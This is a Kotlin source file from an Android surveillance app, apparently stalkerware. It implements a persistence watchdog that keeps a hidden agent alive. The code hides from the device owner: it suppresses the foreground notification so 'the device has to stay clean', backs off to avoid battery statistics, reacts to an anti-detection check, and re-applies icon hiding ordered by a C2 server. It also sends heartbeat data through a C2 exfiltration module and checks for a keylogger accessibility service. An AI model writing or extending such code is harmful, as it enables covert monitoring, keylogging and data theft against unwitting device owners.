package com.sp.watchdog

import android.content.Context
import android.util.Log
import com.sp.core.agent.AgentWorker
import com.sp.core.c2.Exfil
import com.sp.core.stealth.AntiDetect
import com.sp.core.stealth.IconHider
import com.sp.core.util.Prefs

/**
 * Watchdog with exponential back-off.
 *
 * Every system broadcast used to trigger an immediate service restart, which
 * made the app an obvious battery/statistics outlier. Now:
 *  - a cool-down window is respected (next allowed run is persisted)
 *  - the interval grows exponentially while the app keeps dying
 *  - the alarm interval follows the back-off instead of a fixed 60s tick
 *
 * The watchdog no longer starts a foreground service - it runs the agent
 * tick. A foreground service would show a notification on every modern
 * Android, and the device has to stay clean.
 */
object HealthCheck {
    private const val TAG = "HealthCheck"
    private const val KEY_FAILS = "hc_fails"
    private const val KEY_NEXT_RUN = "hc_next_run"

    const val BASE_INTERVAL_MS = AgentWorker.TICK_INTERVAL_MS
    const val MAX_INTERVAL_MS = 30 * 60_000L

    /**
     * Runs the agent tick and returns the interval until the next run.
     * The caller arms the alarm with it, so the chain never dies.
     */
    fun run(ctx: Context, force: Boolean = false): Long {
        val now = System.currentTimeMillis()

        if (!force) {
            val next = Prefs.get(ctx, KEY_NEXT_RUN, 0L) as Long
            if (now < next) return (next - now).coerceAtLeast(1_000L)
        }

        if (AntiDetect.isCompromised(ctx)) return MAX_INTERVAL_MS

        // The icon follows the user's choice - the watchdog must not bring
        // the icon back after the C2 command "hide". The activity itself
        // stays enabled, so the app is always startable.
        try { IconHider.applySaved(ctx) } catch (_: Throwable) {}

        var alive = true
        try {
            AgentWorker.tick(ctx, force = force)
        } catch (t: Throwable) {
            alive = false
            Log.w(TAG, "tick failed: ${t.message}")
        }

        val fails = if (alive) 0 else (Prefs.get(ctx, KEY_FAILS, 0) as Int + 1).coerceAtMost(6)
        Prefs.set(ctx, KEY_FAILS, fails)

        val backoff = if (fails <= 0) BASE_INTERVAL_MS
        else (BASE_INTERVAL_MS shl (fails - 1).coerceIn(0, 5)).coerceAtMost(MAX_INTERVAL_MS)

        Prefs.set(ctx, KEY_NEXT_RUN, now + backoff)

        Exfil.sendLog(ctx, "heartbeat",
            """{"ts":${System.currentTimeMillis()},"fails":$fails,"interval":$backoff}""")
        Log.i(TAG, "alive=$alive fails=$fails next=${backoff}ms")
        return backoff
    }

    private fun isAccessibilityEnabled(ctx: Context): Boolean {
        val enabled = android.provider.Settings.Secure.getString(
            ctx.contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(ctx.packageName + "/.accessibility.KeylogService")
    }
}
